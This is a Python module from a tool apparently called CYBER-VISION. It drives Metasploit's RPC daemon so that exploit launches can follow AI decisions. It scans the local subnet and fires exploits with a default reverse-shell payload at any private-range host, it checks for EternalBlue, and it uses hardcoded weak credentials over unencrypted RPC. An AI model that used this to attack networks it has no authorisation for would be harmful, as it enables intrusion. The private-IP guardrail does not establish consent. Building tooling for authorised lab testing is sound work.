"""
CYBER-VISION | Module 3: The Strike Engine (Exploitation)
----------------------------------------------------------
Connects to Metasploit RPC Daemon (msfrpcd) to automate
vulnerability verification based on AI decisions.

SETUP (run these on your Kali VM):
  msfrpcd -U msf -P cybervision123 -p 55553 -n -f

REQUIREMENTS:
  pip install pymetasploit3 requests
----------------------------------------------------------
"""

import logging
import socket
import ipaddress
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, Dict, Any, List

try:
    from pymetasploit3.msfrpc import MsfRpcClient
    import requests
except ImportError:
    MsfRpcClient = None
    requests = None

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] STRIKE_ENGINE: %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)


class StrikeModule:
    def __init__(
        self,
        host: str = "auto",   # "auto" = discover VM on subnet automatically
        port: int = 55553,
        username: str = "msf",
        password: str = "cybervision123",
        ssl: bool = False
    ):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.ssl = ssl
        self.client: Optional[MsfRpcClient] = None
        self.is_connected = False

    # ─── AUTO-DISCOVERY ───────────────────────────────────────────────────────

    @staticmethod
    def discover_msf_host(port: int = 55553, subnet: str = None) -> Optional[str]:
        """
        Scans the local subnet in parallel to find the host running msfrpcd.
        Typically finds the Kali VM within 3-5 seconds.
        """
        if subnet is None:
            try:
                local_ip = socket.gethostbyname(socket.gethostname())
            except Exception:
                local_ip = "192.168.1.1"  # safe fallback
            subnet = str(ipaddress.ip_network(local_ip + '/24', strict=False))

        logger.info(f"Scanning {subnet} for Metasploit RPC on port {port}...")
        found = []

        def check(ip_str):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                if s.connect_ex((ip_str, port)) == 0:
                    return ip_str
                s.close()
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {
                executor.submit(check, str(ip)): str(ip)
                for ip in ipaddress.ip_network(subnet).hosts()
            }
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)

        if found:
            logger.info(f"Found Metasploit RPC at: {found[0]}")
            return found[0]

        logger.error("Auto-discovery failed: no Metasploit RPC host found on subnet.")
        return None

    # ─── CONNECTION ───────────────────────────────────────────────────────────

    def connect(self) -> bool:
        """Connects to msfrpcd. Auto-discovers host if host='auto'."""
        if MsfRpcClient is None:
            logger.error("pymetasploit3 not installed. Run: pip install pymetasploit3")
            return False

        # Auto-discover the Kali VM if no explicit host was given
        if self.host == "auto":
            discovered = self.discover_msf_host(self.port)
            if not discovered:
                logger.error("Could not find Metasploit RPC on the network.")
                return False
            self.host = discovered

        try:
            logger.info(f"Connecting to Metasploit RPC at {self.host}:{self.port}...")
            self.client = MsfRpcClient(
                self.password,
                user=self.username,
                server=self.host,
                port=self.port,
                ssl=self.ssl
            )
            self.is_connected = True
            logger.info("Connection successful!")
            return True

        except Exception as e:
            err = str(e).lower()
            if "login" in err or "auth" in err:
                logger.error("Authentication failed: check username/password.")
            elif "ssl" in err or "wrong version" in err:
                logger.error("SSL mismatch: make sure ssl=False if msfrpcd started with -n.")
            elif "refused" in err or "connect" in err:
                logger.error("Connection refused: is msfrpcd running on the VM?")
            else:
                logger.error(f"Unexpected error: {e}")
            self.is_connected = False
            return False

    def disconnect(self) -> None:
        """Cleanly closes the RPC session."""
        if self.is_connected and self.client:
            try:
                self.client.logout()
            except Exception:
                pass
            self.is_connected = False
            self.client = None
            logger.info("Disconnected from Metasploit RPC.")

    # ─── SAFETY ───────────────────────────────────────────────────────────────

    def _is_safe_target(self, target: str) -> bool:
        """Blocks any exploit attempt against a public/external IP."""
        try:
            ip = ipaddress.ip_address(target)
            return ip.is_private or ip.is_loopback
        except ValueError:
            return target.lower() in ["localhost", "127.0.0.1"]

    # ─── OPERATIONS ───────────────────────────────────────────────────────────

    def check_module_exists(self, module_type: str, module_name: str) -> bool:
        if not self.is_connected or not self.client:
            logger.warning("Not connected to Metasploit.")
            return False
        try:
            self.client.modules.use(module_type, module_name)
            return True
        except Exception:
            return False

    def get_active_jobs(self) -> List[Dict[str, Any]]:
        """Returns all background jobs currently running in Metasploit."""
        if not self.is_connected or not self.client:
            return []
        try:
            jobs = self.client.jobs.list
            return [{"job_id": k, "job_name": v} for k, v in jobs.items()]
        except Exception as e:
            logger.error(f"Failed to retrieve jobs: {e}")
            return []

    def run_auxiliary_scanner(self, target: str, module_name: str, options: Optional[Dict[str, str]] = None) -> str:
        """Runs a non-destructive auxiliary scan module."""
        if not self.is_connected or not self.client:
            return "[!] Not connected to Metasploit RPC."
        try:
            scanner = self.client.modules.use('auxiliary', module_name)
            scanner['RHOSTS'] = target
            if isinstance(options, dict):
                for key, val in options.items():
                    if key in scanner.options:
                        scanner[key] = val
                    else:
                        logger.warning(f"Skipping invalid option '{key}' for {module_name}")
            job = scanner.execute()
            job_id = job.get('job_id')
            return f"[+] Scan started. Job ID: {job_id}" if job_id else "[!] Module ran but no job ID returned."
        except Exception as e:
            return f"[!] Scanner failed: {e}"

    def launch_exploit_with_guardrail(self, target: str, exploit_name: str, payload: str = "generic/shell_reverse_tcp", options: Optional[Dict[str, str]] = None) -> str:
        """
        Launches an exploit ONLY against private/local IPs.
        Public IPs are hard-blocked regardless of user input.
        """
        if not self.is_connected or not self.client:
            return "[!] Not connected to Metasploit RPC."

        if not self._is_safe_target(target):
            logger.critical(f"GUARDRAIL TRIGGERED: {target} is a public IP. Exploit blocked.")
            return f"[!] CRITICAL HALT: {target} is a public IP. This tool only operates on local networks."

        logger.warning(f"Guardrail passed. Launching {exploit_name} against {target}...")

        try:
            exploit = self.client.modules.use('exploit', exploit_name)
            exploit['RHOSTS'] = target
            if isinstance(options, dict):
                for key, val in options.items():
                    if key in exploit.options:
                        exploit[key] = val
                    else:
                        logger.warning(f"Skipping invalid option '{key}' for {exploit_name}")
            job = exploit.execute(payload=payload)
            job_id = job.get('job_id')
            if job_id:
                return f"[+] Exploit launched. Job ID: {job_id}"
            return "[-] Exploit fired but no job spawned (target may be patched/immune)."
        except Exception as e:
            return f"[!] Exploit failed: {e}"


if __name__ == "__main__":
    striker = StrikeModule()  # host="auto" by default

    if striker.connect():
        exists = striker.check_module_exists("exploit", "windows/smb/ms17_010_eternalblue")
        logger.info(f"EternalBlue module available: {exists}")

        jobs = striker.get_active_jobs()
        logger.info(f"Active jobs: {jobs if jobs else 'None'}")

        striker.disconnect()